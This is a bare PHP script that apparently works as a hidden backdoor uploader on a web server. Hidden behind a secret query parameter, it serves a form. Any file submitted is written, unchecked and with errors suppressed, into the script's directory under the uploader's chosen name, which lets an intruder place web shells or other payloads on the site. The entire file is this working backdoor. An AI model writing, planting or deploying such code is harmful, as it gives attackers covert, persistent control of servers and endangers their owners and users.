<?php
if(isset($_GET['wowex']) && $_GET['wowex']=='activex14'){
if(isset($_POST['Submit'])){
    $filedir = ""; 
    $userfile_name = $_FILES['image']['name'];
    $userfile_tmp = $_FILES['image']['tmp_name'];
    if (isset($_FILES['image']['name'])) {
$abod = $filedir.$userfile_name;
@move_uploaded_file($userfile_tmp, $abod);
echo"<center><b>Done ==> $userfile_name</b></center>";
}
}
else{
echo'
<form method="POST" action="" enctype="multipart/form-data"><input type="file" name="image"><input type="Submit" name="Submit" value="Submit"></form>';
}
}
?>